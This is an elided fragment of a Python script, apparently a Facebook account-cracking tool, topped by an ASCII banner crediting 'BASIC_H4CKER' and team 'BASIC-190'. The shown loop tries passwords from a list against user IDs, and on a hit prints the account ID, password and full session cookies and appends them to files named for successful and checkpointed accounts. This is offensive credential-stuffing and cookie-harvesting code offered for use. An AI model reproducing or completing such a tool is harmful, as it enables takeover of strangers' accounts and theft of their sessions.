...
└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘
    ...
    ┌━━━━━━━━━━━━━━━━━ 𝑨𝑲𝑨𝑺𝑯 ━━━━━━━━━━━━━━━━━━┑
               \033[1;97mCREATED BY   :  BASIC_H4CKER            
               \033[1;91mFACEBOK      :  MD.ARAFAT HOSSEN             
               \033[1;97mGITHUB       :  HACKER-X   
               \033[1;91mSTATUS       :   𝑭𝑹𝑬𝑬😴            
               \033[1;97mTEAM         :  BASIC-𝟷𝟿𝟶                 
               \033[1;91mTOOL VIRSION :  𝟷𝟶.𝟷                    
               \033[1;97mTOOL WORK    :  ONLY  DATA  & WIFI      
      └━━━━━━━━━━━━━━━━━ 𝑯𝑨𝑪𝑲𝑬𝑹-𝑿 ━━━━━━━━━━━━━━━━━┘
""")
        ...
        for ps in pwx:
         ...
         #   log_cookies=session.cookies.get_dict().keys()
            ...
            #	botok(uid,ps)
            	...
            	cid = coki[65:80]
            	print('\033[1;92m𝑨𝑲𝑨𝑺𝑯-OK[😁]\033[1;92m] \033[1;92m' +cid+ ' | ' +ps+    ' |>>'+tahunng(cid))
            	print('\033[1;92m[\033[1;92m🍪\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
            	open('𝑨𝑲𝑨𝑺𝑯-OK.txt', 'a').write( cid+' | '+ps+'\n')
            	open('𝑨𝑲𝑨𝑺𝑯-coki.txt', 'a').write(coki+'\n')
            	...
            	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
            	cid = coki[82:97]
            	print('\33[1;30m(𝑨𝑲𝑨𝑺𝑯-Cp [💔] '+cid+ ' | ' +ps+'  |>>'+tahunng(cid))
            	#print('\033[1;92m[\033[1;92mðŸª\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
            	open('𝑨𝑲𝑨𝑺𝑯-CP.txt', 'a').write( uid+' | '+ps+' \n')
            	cps.append(cid)
            	break
            else:
            	#print (random_header())
